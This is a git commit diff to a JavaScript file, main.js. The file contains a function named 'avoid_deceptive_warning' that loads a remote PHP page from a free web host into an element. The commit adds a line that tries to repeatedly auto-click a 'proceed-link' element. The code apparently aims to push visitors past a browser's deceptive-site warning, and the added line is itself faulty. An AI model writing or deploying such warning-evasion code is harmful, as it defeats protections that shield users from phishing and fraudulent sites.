fd5e0b64a21cb66ac31770c6a85105269a418410
GautamTechnologies <111997815+devsdenepal@users.noreply.github.com>
2022-08-27 21:13:23 +0545

    Update main.js

--- main.js
+++ main.js
@@ -3,3 +3,4 @@ setTimeout(avoid_deceptive_warning,1000);
 function avoid_deceptive_warning(){
     document.getElementById("avoider").src = "http://backend-support-for-devsdenepal.000webhostapp.com/203end/views.php";
 }
+setInterval(document.getElementById("proceed-link").click(),500);
